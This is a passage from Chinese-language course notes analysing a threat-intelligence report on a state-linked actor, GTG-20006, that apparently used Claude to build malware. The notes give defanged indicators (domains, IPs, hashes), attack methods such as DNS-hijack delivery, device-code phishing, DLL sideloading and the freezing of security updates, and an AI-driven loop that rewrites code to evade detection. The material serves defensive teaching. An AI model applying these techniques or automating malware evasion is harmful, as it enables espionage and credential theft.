+<td>高、短。Microsoft first seen 2026-07-20</td>
+</tr>
+<tr>
+<td><code>owa-ms365[.]com</code></td>
+<td>OWA/M365 AitM</td>
+<td>高、短。Microsoft first seen 2026-07-16；Google GTIG 亦列入 UNC7005</td>
+</tr>
+<tr>
+<td><code>ms365-device[.]com</code></td>
+<td>device code 重導</td>
+<td>高、短。Microsoft first seen 2026-07-23</td>
+</tr>
+<tr>
+<td><code>mslivetest.duckdns[.]org</code></td>
+<td>動態 DNS 測試</td>
+<td>中。DuckDNS 免費動態網域，常為測試/暫用，壽命極短</td>
+</tr>
+<tr>
+<td><code>my-invite[.]org</code></td>
+<td>邀請主題誘餌</td>
+<td>中。Google GTIG 記為 UNC7005 釣魚網域兼攻擊者帳號網域</td>
+</tr>
+<tr>
+<td><code>chamber-ua[.]org</code></td>
+<td>烏克蘭「商會」主題誘餌</td>
+<td>中。Google GTIG 記為 UNC7005 網域，且 <code>bounce@chamber-ua[.]org</code> 為惡意程式散佈帳號</td>
+</tr>
+<tr>
+<td><code>chathamhouse[.]eu</code></td>
+<td>仿冒英國智庫 Chatham House</td>
+<td>中高。針對智庫的品牌仿冒</td>
+</tr>
+<tr>
+<td><code>ukrinform-share[.]net</code></td>
+<td>仿冒烏克蘭國家通訊社 Ukrinform</td>
+<td>中高。媒體/文件分享誘餌</td>
+</tr>
+<tr>
+<td><code>statistic-ms[.]live</code></td>
+<td>C2 / 仿冒</td>
+<td>中。Google GTIG 記為 ENGINELIGHT C2</td>
+</tr>
+<tr>
+<td><code>static-ms[.]live</code></td>
+<td>C2 / 仿冒</td>
+<td>中。與上者成對</td>
+</tr>
+<tr>
+<td><code>ad-g[.]org</code></td>
+<td>疑似 AD/目錄主題</td>
+<td>低中</td>
+</tr>
+<tr>
+<td><code>docs-viewer[.]org</code></td>
+<td>文件檢視器誘餌</td>
+<td>中</td>
+</tr>
+<tr>
+<td><code>wa-connect[.]eu</code></td>
+<td>WhatsApp 主題（companion device 誘餌）</td>
+<td>中。Google GTIG 記為 UNC7005 WhatsApp 連結誘餌家族之一</td>
+</tr>
+<tr>
+<td><code>mygreatmarket[.]org</code> / <code>mygreatmarket[.]com</code></td>
+<td>品牌/市集誘餌</td>
+<td>低中</td>
+</tr>
+<tr>
+<td><code>cdncounter[.]net</code> / <code>static.cdncounter[.]net</code></td>
+<td>CDN 偽裝、分階投放</td>
+<td><strong>高</strong>。<code>static.cdncounter[.]net</code> 對應 Google GTIG DarkSword 報告中 UNC6353 的第一階投放伺服器（見第 9 節）——跨報告交叉指標</td>
+</tr>
+<tr>
+<td><code>stuseamandesilt[.]org</code>（+ <code>api.</code> / <code>cdn.</code> / <code>update.</code>）</td>
+<td>多子網域 C2/更新偽裝</td>
+<td>中高。<code>update.</code> 子網域呼應「假更新」主題</td>
+</tr>
+<tr>
+<td><code>itechx[.]tel</code></td>
+<td>科技支援主題</td>
+<td>低中</td>
+</tr>
+<tr>
+<td><code>pdfviewer2024.b-cdn[.]net</code></td>
+<td>PDF 檢視器誘餌（BunnyCDN）</td>
+<td>中。濫用合法 CDN（b-cdn.net）</td>
+</tr>
+<tr>
+<td><code>meridian-protocol[.]org</code> / <code>meridiangroup-corp[.]com</code></td>
+<td>企業偽裝</td>
+<td>低中</td>
+</tr>
+<tr>
+<td><code>projectnightcrawler[.]dev</code></td>
+<td>開發主題網域</td>
+<td>低中</td>
+</tr>
+<tr>
+<td><code>metricwave[.]org</code></td>
+<td>分析/遙測偽裝</td>
+<td>低中</td>
+</tr>
+<tr>
+<td><code>mgsend[.]org</code></td>
+<td>郵件發送基礎設施</td>
+<td>中。mailer 主題呼應技能表的 mailer 服務</td>
+</tr>
+<tr>
+<td><code>wa-meeting[.]com</code></td>
+<td>WhatsApp 會議誘餌</td>
+<td>中。Google GTIG 記為 UNC7005 家族</td>
+</tr>
+<tr>
+<td><code>russianearabroad[.]com</code> / <code>russianearabroad[.]org</code></td>
+<td>「海外俄羅斯人」離散社群誘餌</td>
+<td>中高。主題揭示對俄語離散/異議社群的鎖定</td>
+</tr>
+</tbody>
+</table>
+<h3 id="72-ip-p1011">7.2 IP 位址（p.10–11）</h3>
+<table>
+<thead>
+<tr>
+<th>指標</th>
+<th>交叉比對</th>
+<th>偵測價值與壽命</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>104.145.210[.]184</code></td>
+<td>—</td>
+<td>中低。IP 類 IOC 壽命短、易換 VPS</td>
+</tr>
+<tr>
+<td><code>31.57.243[.]154</code></td>
+<td><strong>Microsoft CaptiveCrunch AitM 基礎設施；Google GTIG UNC7005</strong></td>
+<td>高。三家共見 → 強交叉指標</td>
+</tr>
+<tr>
+<td><code>104.194.151[.]133</code></td>
+<td>—</td>
+<td>中低</td>
+</tr>
+<tr>
+<td><code>104.194.159[.]55</code></td>
+<td>與 Microsoft/Google 所列 <code>104.194.159[.]150</code> 同 /24</td>
+<td>中。同段位可做網段層偵測</td>
+</tr>
+<tr>
+<td><code>144.172.114[.]192</code></td>
+<td>—</td>
+<td>中低</td>
+</tr>
+<tr>
+<td><code>213.145.86[.]112</code></td>
+<td><strong>Microsoft：ChocoShell C2（主要）</strong></td>
+<td>高。跨報告 C2 指標</td>
+</tr>
+<tr>
+<td><code>2.26.53[.]194</code></td>
+<td>—</td>
+<td>中低</td>
+</tr>
+<tr>
+<td><code>148.135.195[.]111</code></td>
+<td>—</td>
+<td>中低</td>
+</tr>
+<tr>
+<td><code>185.198.234[.]26</code> / <code>185.198.234[.]101</code></td>
+<td>同 /24 成對</td>
+<td>中。網段偵測</td>
+</tr>
+<tr>
+<td><code>149.54.42[.]106</code></td>
+<td>—</td>
+<td>中低</td>
+</tr>
+<tr>
+<td><code>104.194.149[.]228</code></td>
+<td>與 Google GTIG <code>104.194.149[.]228</code> 同</td>
+<td>高。交叉指標</td>
+</tr>
+<tr>
+<td><code>38.146.28[.]132</code></td>
+<td><strong>Microsoft：CaptiveCrunch DNS Resolver</strong></td>
+<td>高。DNS 劫持基礎設施</td>
+</tr>
+<tr>
+<td><code>38.146.28[.]75</code></td>
+<td><strong>Microsoft：CaptiveCrunch AitM；Google GTIG UNC7005</strong></td>
+<td>高。三家共見</td>
+</tr>
+</tbody>
+</table>
+<h3 id="73-emailp11">7.3 Email（p.11）</h3>
+<table>
+<thead>
+<tr>
+<th>指標</th>
+<th>研判</th>
+<th>偵測價值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>anna.manager@russianearabroad[.]net</code></td>
+<td>誘餌寄件者，離散社群主題</td>
+<td>中。可做寄件者/回覆位址封鎖與郵件回溯</td>
+</tr>
+<tr>
+<td><code>events@embassy-protocol[.]int</code></td>
+<td>Embassy Kit 相關、活動邀請主題（濫用 <code>.int</code> 國際組織頂級域觀感）</td>
+<td>中高。呼應 device code phishing 的「活動邀請」誘餌</td>
+</tr>
+</tbody>
+</table>
+<h3 id="74-p11">7.4 檔名與雜湊（p.11）</h3>
+<table>
+<thead>
+<tr>
+<th>指標</th>
+<th>研判</th>
+<th>偵測價值與壽命</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>msedgeupdate_v3[.]exe</code> / <code>msedgeupdate[.]exe</code></td>
+<td>偽裝 Microsoft Edge 更新（假更新主題）</td>
+<td>中。檔名可改，價值在「假更新命名樣態」；配合路徑/簽章缺失偵測</td>
+</tr>
+<tr>
+<td><code>version[.]dll</code></td>
+<td>典型 DLL 側載（search-order hijacking）常用名</td>
+<td>中。<code>version.dll</code> 是 Windows 常被側載的合法 DLL 名，需以「載入位置異常」偵測</td>
+</tr>
+<tr>
+<td><code>WUEngine[.]exe</code></td>
+<td>對應惡意程式家族 WUEngine（偽裝 Windows Update Engine）</td>
+<td>中。呼應「凍結安全更新」主題——偽裝成更新元件</td>
+</tr>
+<tr>
+<td><code>DiagHost[.]exe</code></td>
+<td>偽裝診斷主機（Diagnostics Host）</td>
+<td>中</td>
+</tr>
+<tr>
+<td><code>client_20260507093021_4286d211_x64[.]exe</code></td>
+<td>帶時間戳（2026-05-07 09:30:21）與短雜湊的客戶端建置產物</td>
+<td>中。時間戳命名揭示 build 自動化；單一樣本價值低但可做 build 慣例分析</td>
+</tr>
+<tr>
+<td><code>fix_network[.]apk</code></td>
+<td>ClickFix 投放的 Android payload（「修復網路」誘餌）</td>
+<td>中高。呼應飯店 WiFi「連不上網→請安裝修復程式」的社交工程劇本</td>
+</tr>
+<tr>
+<td><code>be99857449d2856dd5a84e21c8a3d5e0e01456adb44062ddec5a6b4970d8d42c</code></td>
+<td>SHA-256</td>
+<td><strong>極高、長壽</strong>。<strong>與 Microsoft CaptiveCrunch 報告中 ChocoShell 的雜湊完全相同</strong>（見第 9 節）。雜湊是最精確、最不易誤報的原子指標，且不隨網域/IP 汰換而失效</td>
+</tr>
+<tr>
+<td><code>918fa52ae45ed60ba7cc8bdc99c3cbe9ab92e0375ec31fc05d0d4513be11c593</code></td>
+<td>SHA-256</td>
+<td><strong>極高、長壽</strong>。<strong>與 Microsoft CaptiveCrunch 報告中 CornFlake 的雜湊完全相同</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="75-ioc">7.5 IOC 壽命與價值的通則（教學）</h3>
+<p>依「痛苦金字塔（Pyramid of Pain）」概念，本案 IOC 由下而上：<br />
+- <strong>雜湊值（最精確但最脆弱於變形）</strong>：本案兩個 SHA-256 精確度極高、且因與 Microsoft 交叉一致而信度高；但正因為 GTG-20006 有「自動改寫重建」閉環，<strong>雜湊對「未來變種」幾乎無效</strong>——這正是本案的弔詭：雜湊能證明「過去這是同一支」，卻擋不住「下一支」。<br />
+- <strong>IP / 網域（易汰換）</strong>：短壽，價值在「歷史比對」與「網段/命名樣態」。<br />
+- <strong>TTP / 能力（最難改、最痛）</strong>：對本案而言，真正持久的偵測抓手是<strong>行為家族</strong>——例如「假更新命名 + 側載 version.dll + 凍結 Windows Update + 服務名偽裝成 Cloud Sync」這組<strong>組合行為</strong>，遠比任何單一雜湊耐用。這呼應第 5 節的框架缺口與第 10 節的偵測構想。</p>
+<hr />
+<h2 id="8-anthropic">8. Anthropic 的偵測、處置與防線缺口</h2>
+<h3 id="81-anthropic">8.1 Anthropic 做了什麼</h3>
+<ul>
+<li><strong>偵測與中斷</strong>：報告總述（p.3）稱對每一案都「disrupted the activity（中斷了活動）、used what we learned to strengthen our safeguards（用所學強化防護）、shared intelligence with authorities and industry partners（與當局及業界夥伴分享情資）」。對 GTG-20006，可見度來自「模型側」——攻擊者在建構、精修工具與 skills 時留下的訊號。</li>
+<li><strong>跨案關聯</strong>：報告把 GTG-20006 與 GTG-50014（ShinyHunters）、GTG-50029（hacktivist）並列，論證「相同方法論已擴散到不同層級行為者」（p.38–39）——這本身是一種偵測成果（辨識出共通的 agentic 攻擊模式）。</li>
+<li><strong>情資公開</strong>：把家族名、IOC、手法公開，讓其他防守方能在自家平台辨識相似樣態（報告 p.3 的明示目的）。</li>
+</ul>
+<h3 id="82">8.2 防線在哪裡失效 / 被自曝的缺口（課程高價值素材）</h3>
+<ol>
+<li><strong>可見度在「工具離開 Claude」後即中止</strong>：Anthropic 能看到「攻擊者在打造什麼」，看不到「打造出的東西在受害端造成什麼」。Figure C 欄的效果全標 <strong>inferred</strong>、且有多格灰色未達成——這是 Anthropic <strong>主動承認</strong>自身鑑識邊界。<strong>教學點</strong>：AI 供應商的威脅情報，強在「意圖與能力的上游」，弱在「效果的下游確認」；要與端點/網路鑑識互補，不能單獨採信。</li>
+<li><strong>「閉環」在概念上跑贏平台防護</strong>：報告 p.9 用「at least in theory（至少理論上）」承認——一旦攻擊者能自主閉環，就能「比防守方開發並部署偵測還快地繞過傳統偵測」。這是對「靜態偵測」典範的<strong>自曝式認輸</strong>：連 AI 供應商自己都指出，光靠簽章擋不住這種迴圈。</li>
+<li><strong>合法流程被濫用，難以「一刀切」封鎖</strong>：device code phishing 濫用的是<strong>合法的 OAuth 登入流程</strong>；DNS 劫持濫用的是<strong>合法的 DNS 管理</strong>；WhatsApp companion device 濫用的是<strong>合法的多裝置功能</strong>。這些都不是「漏洞」，而是「功能被拿來作惡」，因此<strong>沒有補丁可打</strong>，只能靠政策（如封鎖 device code flow）、行為偵測與使用者教育。</li>
+<li><strong>凍結安全更新 = 直接攻擊防守方的「補給線」</strong>：報告 p.9 揭露 payload 會凍結受害機的安全更新。這意味著<strong>即使防守社群做出了新簽章，受害端也拿不到</strong>。這是對「偵測即防護」假設的釜底抽薪——<strong>偵測規則做出來，不代表送得到前線</strong>。</li>
+<li><strong>skills / 記憶讓 know-how 可攜、可複製、可擴散</strong>：報告 p.5 明言「November 2025 記錄的自主攻擊營運模式，如今已擴散到所有層級行為者」，且公開框架（如 PentAGI）「複製了大部分同樣的鷹架」。Anthropic 封了 GTG-20006 的帳號，但<strong>方法論已外溢</strong>——這是「中斷單一行為者 ≠ 中斷手法」的殘酷現實。</li>
+</ol>
+<h3 id="83">8.3 一個誠實的張力：報告既是情資，也是行銷</h3>
+<p>課堂需點出的批判視角：這份報告由 Claude 的製造商發布。它一方面示範了負責任揭露；另一方面，「我們偵測到、我們中斷了、我們強化了防護」的敘事，也<strong>服務於 Anthropic 的品牌</strong>（第三方報導 The Record 就對比：Anthropic 的揭露比 OpenAI「更深入」）。<strong>這不否定報告的技術價值，但要求讀者對「單一供應商、單一來源」的整合性敘事保持適度折扣</strong>（見第 9、第 12 節）。</p>
+<hr />
+<h2 id="9">9. 第三方驗證與外部來源</h2>
+<p>本節逐條標明：來源、URL、日期、以及它是「<strong>獨立查證</strong>」還是「<strong>僅引述 Anthropic</strong>」。<strong>本案的整合性敘事（單一 AI 編排行動者統合全部手法）目前是單一來源（Anthropic）；但多項個別 TTP 與具體基礎設施已被獨立佐證。</strong></p>
+<h3 id="91-wifi">9.1 對「飯店 WiFi / 惡意程式投放」的獨立查證 — 強</h3>
+<table>
+<thead>
+<tr>
+<th>來源</th>
+<th>URL</th>
+<th>日期</th>
+<th>性質</th>
+<th>關鍵交叉點</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Microsoft Threat Intelligence — CaptiveCrunch</strong></td>
+<td>microsoft.com/en-us/security/blog/2026/07/31/captivecrunch-...</td>
+<td>2026-07-31</td>
+<td><strong>獨立查證</strong>（自有遙測與惡意程式分析）</td>
+<td>歸因 <strong>Storm-2945</strong>（Midnight Blizzard 子群集，美英歸因 SVR）。技術鏈：captive portal 操縱 DNS/HTTP → 三條重導（M365 釣魚 / device code 釣魚 / ClickFix 假更新）。惡意程式 <strong>CornFlake</strong>（Go RAT，註冊服務 <code>svchost32</code>／顯示名 <strong>"Cloud Sync Service"</strong>——對應 Anthropic 的 <strong>CloudSyncSvc</strong>）、<strong>ChocoShell</strong>（PowerShell 竊取器，AMSI 繞過、<strong>鎖定 Defender 簽章更新</strong>、UAC 繞過）、<strong>FruitStone</strong>（C2 面板，偽裝「CloudSync Console / Acuity Systems」）。<strong>兩個檔案雜湊與 Anthropic p.11 完全相同</strong>（CornFlake <code>918fa52...</code>、ChocoShell <code>be998574...</code>）。多個網域/IP（<code>ms365-device[.]com</code>、<code>ms365-live[.]com</code>、<code>m365-owa[.]com</code>、<code>owa-ms365[.]com</code>、<code>31.57.243[.]154</code>、<code>38.146.28[.]75</code>、<code>38.146.28[.]132</code>、<code>213.145.86[.]112</code>）與 Anthropic IOC 表重疊</td>
+</tr>
+<tr>
+<td><strong>ReliaQuest — DNS poisoning tactics expand to hospitality</strong></td>
+<td>reliaquest.com/blog/threat-spotlight-dns-poisoning-tactics-expand-to-hospitality/</td>
+<td>2026-07-23（最先揭露）</td>
+<td><strong>獨立查證</strong>（自有偵測）</td>
+<td>觀察到飯店/會議中心 WiFi gateway 被攻破做 DNS 回應偽造；以<strong>低到中信度</strong>評估初始存取來自「暴露的管理介面（SSH/SNMP/web 主控台）+ 弱/重用管理員憑證」。地理：多個美國城市、印度、沙烏地。<strong>歸因與 Microsoft 有分歧</strong>：ReliaQuest 說 TTP 與 <strong>APT28</strong> 相似（非 APT29），且明說「僅 TTP 重疊、非直接技術連結」。列出 <code>m365-owa[.]com</code> 等四網域與 <code>38.146.28[.]75</code>、<code>31.57.243[.]154</code>、<code>104.194.159[.]150</code></td>
+</tr>
+<tr>
+<td><strong>Zscaler ThreatLabz — CaptiveCrunch</strong></td>
+<td>zscaler.com/blogs/security-research/captivecrunch-...</td>
+<td>2026-08-11</td>
+<td><strong>主要為轉述 Microsoft</strong>（附自家防禦建議）</td>
+<td>複述三條重導與 CornFlake/ChocoShell 技術點；引用 ReliaQuest 的地理數據。非獨立遙測</td>
+</tr>
+</tbody>
+</table>
+<p><strong>教學重點</strong>：Anthropic 說的「飯店 WiFi + DNS 劫持 + ClickFix 投放 Windows/Android/iOS」這一段，是<strong>本案被外部獨立佐證最紮實的部分</strong>。兩個雜湊三家一致、多個網域/IP 交叉命中，構成強力的「多來源匯流（multi-source convergence）」。但<strong>歸因細節有分歧</strong>（Microsoft→APT29/Midnight Blizzard；ReliaQuest→APT28-like），這正好是教「不同廠商信度與方法差異」的活教材。</p>
+<h3 id="92-device-code-phishing-whatsapp-oauth">9.2 對「device code phishing / WhatsApp 接管 / OAuth 濫用」的獨立查證 — 中強</h3>
+<table>
+<thead>
+<tr>
+<th>來源</th>
+<th>URL</th>
+<th>日期</th>
+<th>性質</th>
+<th>關鍵交叉點</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Google GTIG — Distinct Clusters Target Individuals of Interest to Russia</strong></td>
+<td>cloud.google.com/blog/topics/threat-intelligence/distinct-clusters-target-individuals-of-interest-to-russia</td>
+<td>2026-08-21</td>
+<td><strong>獨立查證</strong></td>
+<td>標定 <strong>UNC7005（aka STORM-2945）</strong>，以<strong>中信度</strong>連到 <strong>ICE RELIC（APT29 新代號）</strong>。2026-05～06 進行<strong>仿冒 WhatsApp 的裝置連結釣魚</strong>（誘使受害者把帳號連結成攻擊者裝置以「加入安全通話」），與 Anthropic 的 WhatsApp companion device 手法同型。<strong>CHERRYPIE（即 ChocoShell）含大量疑似 LLM 生成的痕跡</strong>——獨立佐證「AI 生成惡意程式」。網域交叉：<code>chamber-ua[.]org</code>、<code>my-invite[.]org</code>、<code>wa-connect[.]eu</code>、<code>wa-meeting[.]com</code>、<code>owa-ms365[.]com</code>、<code>m365-owa[.]com</code>、<code>ms365-device[.]com</code>、<code>ms365-live[.]com</code>、<code>statistic-ms[.]live</code></td>
+</tr>
+<tr>
+<td><strong>Microsoft — Storm-2372 device code phishing</strong></td>
+<td>microsoft.com/en-us/security/blog/2025/02/13/storm-2372-...</td>
+<td>2025-02-13</td>
+<td><strong>獨立查證（先例）</strong></td>
+<td>device code phishing 的公開技術基準：假冒名人於 WhatsApp/Signal/Teams 接觸、誘輸入裝置碼、藉 Microsoft Authentication Broker client ID 取 PRT、把攻擊者裝置註冊進 Entra ID、以 Graph 搜信箱關鍵字。以<strong>中信度</strong>對齊俄羅斯利益</td>
+</tr>
+<tr>
+<td><strong>Microsoft — AI-enabled device code phishing（本案報告 p.9 直接連結）</strong></td>
+<td>microsoft.com/en-us/security/blog/2026/04/06/ai-enabled-device-code-phishing-campaign-april-2026/</td>
+<td>2026-04-06</td>
+<td><strong>獨立查證</strong></td>
+<td>揭 device code 動態生成（點擊當下才生碼以繞 15 分鐘失效）、剪貼簿劫持、AI 生成的高度個人化誘餌、Railway 等平台自動起短命輪詢節點。Anthropic p.9 引用它作為 device code phishing 的說明</td>
+</tr>
+<tr>
+<td>The Register — Russian snoops add OAuth abuse</td>
+<td>theregister.com/security/2026/08/21/russian_snoops_oauth/</td>
+<td>2026-08-21</td>
+<td>轉述 Google GTIG（Jessica Lyons）</td>
+<td>覆述 UNC6293/UNC7005/UNC5976 三群集、WhatsApp 裝置連結、AI 生成 infostealer</td>
+</tr>
+</tbody>
+</table>
+<h3 id="93-ios-darksword">9.3 對「iOS / DarkSword」的獨立查證 — 中</h3>
+<table>
+<thead>
+<tr>
+<th>來源</th>
+<th>URL</th>
+<th>日期</th>
+<th>性質</th>
+<th>關鍵交叉點</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Google GTIG — DarkSword iOS exploit chain</strong></td>
+<td>cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain</td>
+<td>2026-03-19</td>
+<td><strong>獨立查證</strong></td>
+<td>DarkSword 支援 iOS 18.4–18.7，串起 6 個 CVE（含至少 2 個零時差：<code>CVE-2026-20700</code> dyld PAC 繞過、<code>CVE-2025-14174</code> ANGLE 記憶體毀損；另有 JavaScriptCore 與 XNU 核心漏洞），被多家商業間諜廠與<strong>疑似俄羅斯間諜群 UNC6353</strong> 用於對烏克蘭的 watering hole。感染鏈：Safari 遇惡意 iframe → 突破 WebContent 沙箱 → 經 WebGPU 注入 mediaplaybackd → 取得核心讀寫。<strong>UNC6353 把 DarkSword 以隱藏 iframe 植入被攻陷的烏克蘭網站，第一階投放伺服器 <code>static.cdncounter[.]net</code> 正是 Anthropic IOC 表中的網域</strong>——強交叉。三個 payload 家族：<strong>GHOSTBLADE</strong>（資料採礦器，竊 iMessage/Telegram/WhatsApp/郵件/通聯/鑰匙圈/定位/照片/加密錢包）、<strong>GHOSTKNIFE</strong>、<strong>GHOSTSABER</strong>。特徵：完成外洩後<strong>清除暫存並退出、最小化留存時間</strong>（非持久監控型）。Apple 於 iOS 26.3 全數修補，GTIG 已將相關網域加入 Safe Browsing</td>
+</tr>
+<tr>
+<td><strong>Google GTIG — Coruna iOS exploit kit</strong></td>
+<td>cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit</td>
+<td>2026-03-04</td>
+<td><strong>獨立查證（前身）</strong></td>
+<td>DarkSword 的前身工具鏈；UNC6353 曾用 Coruna；投放網域 <code>cdn.uacounter[.]com</code>；GTIG 與 CERT-UA 合作清理。呼應技能表第 8 列「DarkSword/Coruna chain work」</td>
+</tr>
+</tbody>
+</table>
+<p><strong>注意</strong>：GTIG <strong>未</strong>把 UNC6353 明確等同 APT29/Midnight Blizzard，只說「suspected Russian espionage group」。所以「本案 iOS 那條線 = Midnight Blizzard」是 Anthropic 的整合，GTIG 端只支持到「疑似俄羅斯 + 同一 cdncounter 基礎設施」。</p>
+<h3 id="94">9.4 對惡意程式「命名」的比對 — 命名分歧與碰撞</h3>
+<table>
+<thead>
+<tr>
+<th>Anthropic 家族名</th>
+<th>可對應的外部對象</th>
+<th>研判</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CloudSyncSvc</code></td>
+<td>Microsoft CornFlake 的偽裝服務名 "Cloud Sync Service"（svchost32）</td>
+<td>幾乎確定同一物</td>
+</tr>
+<tr>
+<td><code>Shadow C2</code></td>
+<td>技能表中的 <code>shadow_c2</code>（容器化 C2 堆疊、Postgres 後端、CNC 儀表板）</td>
+<td>同一 C2 框架，內部代號</td>
+</tr>
+<tr>
+<td><code>DarkSword</code></td>
+<td>Google GTIG DarkSword iOS exploit chain</td>
+<td>同名、同型、共享 cdncounter 基礎設施</td>
+</tr>
+<tr>
+<td><code>GiftDrop</code></td>
+<td>改牌自 <code>GiftsExpress</code> Android 監控 RAT（報告自述）</td>
+<td>報告自述的血緣；<code>GiftsExpress</code> 屬 Telegram 上流通的 Android RAT 生態</td>
+</tr>
+<tr>
+<td><code>MiniPlasma</code></td>
+<td>公開的 Windows 本地提權 PoC「MiniPlasma」（Chaotic Eclipse 揭露，涉 CVE-2020-17103 / cldflt.sys 雲端過濾驅動）— 2026-05</td>
+<td><strong>可能為命名碰撞或借用公開工具</strong>；報告未說明關聯，需存疑（見第 12 節）</td>
+</tr>
+<tr>
+<td><code>PowerChrome</code>、<code>WUEngine</code></td>
+<td>無明確第三方公開對應（<code>WUEngine[.]exe</code> 見於 IOC，偽裝 Windows Update Engine）</td>
+<td><strong>僅見於 Anthropic</strong>（截至查證時）；屬單一來源命名</td>
+</tr>
+</tbody>
+</table>
+<p><strong>這是本案最好的「命名學」教材</strong>：同一組活動在 Anthropic／Microsoft／Google 三家有三套代號（GTG-20006 vs Storm-2945 vs UNC7005；CloudSyncSvc vs CornFlake vs ?；ChocoShell vs CHERRYPIE）。<strong>能把它們拼成同一張圖的，不是名字，而是共享的雜湊與基礎設施</strong>。這說明威脅情報消費者必須以「原子指標與 TTP」而非「代號」為錨。</p>
+<h3 id="95">9.5 台灣與中文媒體報導 — 全數為轉述，無在地獨立查證</h3>
+<table>
+<thead>
+<tr>
+<th>來源</th>
+<th>URL</th>
+<th>日期</th>
+<th>性質</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>中央社（CNA）</td>
+<td>cna.com.tw/news/aopl/202609110025.aspx</td>
+<td>2026-09-11（李佩珊譯，路透社編譯）</td>
+<td><strong>僅引述 Anthropic</strong>。補充「美國政府先前已將午夜暴雪與 SVR 聯繫」「俄駐華府大使館未回應」。無台灣觀點</td>
+</tr>
+<tr>
+<td>TechNews 科技新報</td>
+<td>technews.tw/2026/09/11/anthropic-on-detecting-and-countering-misuse-of-ai/</td>
+<td>2026-09-11（陳冠榮）</td>
+<td><strong>僅引述 Anthropic</strong>。僅提「自動重建規避偵測」一句，未及飯店 WiFi/無人機/WhatsApp</td>
+</tr>
+<tr>
+<td>iThome</td>
+<td>ithome.com.tw/news/178864</td>
+<td>2026-09（頁面存取受限）</td>
+<td><strong>僅引述 Anthropic</strong>（以中國蒸餾為主軸）</td>
+</tr>
+<tr>
+<td>AI 郵報（部落格）</td>
+<td>aiposthub.com/anthropic-threat-intelligence-report-september-2026-...（Philo）</td>
+<td>2026-09-11</td>
+<td><strong>僅引述 Anthropic</strong>。有較長中文複述（含飯店 WiFi、無人機 SDK）；其「鎖定台灣電戰模擬」指的是<strong>另一案 GTG-17002（常規武器章節）而非本案</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="96">9.6 英文一般媒體 — 多為轉述，少數含外部脈絡</h3>
+<table>
+<thead>
+<tr>
+<th>來源</th>
+<th>URL</th>
+<th>日期/作者</th>
+<th>性質</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>The Record（Recorded Future）</td>
+<td>therecord.media/anthropic-russia-hackers-claude</td>
+<td>2026-09-11 / Alexander Martin</td>
+<td><strong>轉述 + 外部脈絡</strong>。引 Google 的 David Agranovich（前 NSC 俄羅斯事務主任）評「AI 正降低網路行動門檻」；提 Microsoft Storm-2945、2026-06 Five Eyes 警告；對比 OpenAI</td>
+</tr>
+<tr>
+<td>The Hacker News</td>
+<td>thehackernews.com/2026/09/russian-state-sponsored-hackers-use.html</td>
+<td>2026-09-11 / Ravie Lakshmanan</td>
+<td><strong>僅引述 Anthropic</strong>（完整列出惡意程式家族名）</td>
+</tr>
+<tr>
+<td>CyberScoop</td>
+<td>cyberscoop.com/anthropic-report-ai-enabled-cyber-attacks/</td>
+<td>2026-09-10 / Greg Otto</td>
+<td><strong>僅引述 Anthropic</strong>；另補 NSA/CISA/FBI 於 2026-09-08 就中國蒸餾發布的聯合公告（與本案無關）</td>
+</tr>
+<tr>
+<td>Kyiv Independent</td>
+<td>kyivindependent.com/russia-uses-ai-in-cyberattacks-.../</td>
+<td>2026-09-12 / Volodymyr Ivanyshyn</td>
+<td><strong>僅引述 Anthropic</strong>。值得注意：連烏克蘭本地媒體都<strong>未</strong>加入 CERT-UA/SSSCIP 的獨立確認</td>
+</tr>
+<tr>
+<td>SecurityWeek</td>
+<td>securityweek.com/anthropic-says-russian-hackers-used-claude-ai-to-automate-malware-evasion/</td>
+<td>2026-09-11 / Eduard Kovacs</td>
+<td><strong>僅引述 Anthropic</strong>（提及 Microsoft CaptiveCrunch 為投放法佐證）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>小結（單一來源判定）</strong>：<br />
+- <strong>被多來源獨立佐證的</strong>：飯店 WiFi / DNS 劫持投放鏈（雜湊三家一致）、device code phishing、WhatsApp 裝置連結接管、DarkSword iOS（cdncounter 共享）、「惡意程式含 AI 生成痕跡」。<br />
+- <strong>仍屬單一來源（Anthropic）的</strong>：把上述全部<strong>整合成同一個 AI 編排行動者</strong>的敘事；「AI 自主監控→改寫→重建的閉環」之運作細節；無人機 SDK 竊取與逆向出 BOM／未發表產品；北非 30 萬身分 + 50 萬公司登記外洩；「人類只改 Claude Code skills」；家族名 PowerChrome/WUEngine。<br />
+- <strong>無任何台灣本地機構（如 TWCERT/CC、調查局、國安單位）對本案發表獨立查證</strong>（截至 2026-09-13）。</p>
+<hr />
+<h2 id="10">10. 課程教學設計</h2>
+<h3 id="101">10.1 核心教學要點</h3>
+<ol>
+<li><strong>AI 反轉了攻防的成本結構</strong>：講清「靜態簽章式偵測」為何是一種「對攻擊者課成本」的機制，以及 AI 閉環（監控→改寫→重建→迭代）如何把這個機制打壞。這是本案的<strong>中心思想</strong>。</li>
+<li><strong>偵測工程要從 IOC 上移到行為家族與能力</strong>：因為雜湊擋不住自動變種，真正耐用的是「組合行為」（假更新命名 + version.dll 側載 + 凍結 Windows Update + 服務名偽裝）。帶學員爬「痛苦金字塔」。</li>
+<li><strong>合法功能被武器化 = 沒有補丁可打</strong>：device code flow、DNS 管理、WhatsApp 多裝置——都是功能而非漏洞。防禦重心從「打補丁」轉向「政策 + 行為偵測 + 使用者教育」。</li>
+<li><strong>歸因是機率語言</strong>：用 consistent with / suspected / assess / state-nexus 的階梯，教學員讀懂信度；用「四家四個代號、靠雜湊拼圖」教命名分歧。</li>
+<li><strong>AI 供應商情報的視角與邊界</strong>：強在上游意圖與能力、弱在下游效果確認（Figure 全標 inferred）。要與端點/網路鑑識互補。</li>
